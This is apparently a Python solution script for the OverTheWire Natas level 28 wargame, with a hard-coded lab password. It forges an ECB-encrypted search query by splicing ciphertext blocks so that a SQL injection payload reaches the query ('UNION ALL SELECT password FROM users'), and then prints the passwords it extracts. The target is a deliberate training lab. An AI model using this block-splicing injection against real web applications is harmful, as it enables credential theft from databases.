import requests
import urllib
import base64

url = "http://natas28.natas.labs.overthewire.org"
s = requests.Session()
s.auth = ('natas28', 'JWwR438wkgTsNKBbcJoowyysdM82YjeF')

# First we generate a baseline for the header/footer
data = {'query':10 * ' '}
r = s.post(url, data=data)
baseline = urllib.parse.unquote(r.url.split('=')[1])
baseline = base64.b64decode(baseline.encode('utf-8'))
header = baseline[:48]
footer = baseline[48:]

# We generate the ciphertext query and parse the result
sqli = 9 * " " + "' UNION ALL SELECT password FROM users;#"
data = {'query':sqli}
r = s.post(url, data=data)
exploit = urllib.parse.unquote(r.url.split('=')[1])
exploit = base64.b64decode(exploit.encode('utf-8'))

# We computer the size of our payload
nblocks = len(sqli) - 10
while nblocks % 16 != 0:
    nblocks += 1 
nblocks = int(nblocks / 16)

# Then, we forge the query
final = header + exploit[48:(48 + 16 * nblocks)] + footer
final_ciphertext = base64.b64encode(final)
search_url = "http://natas28.natas.labs.overthewire.org/search.php"
resp = s.get(search_url, params={"query":final_ciphertext})

print(resp.text)
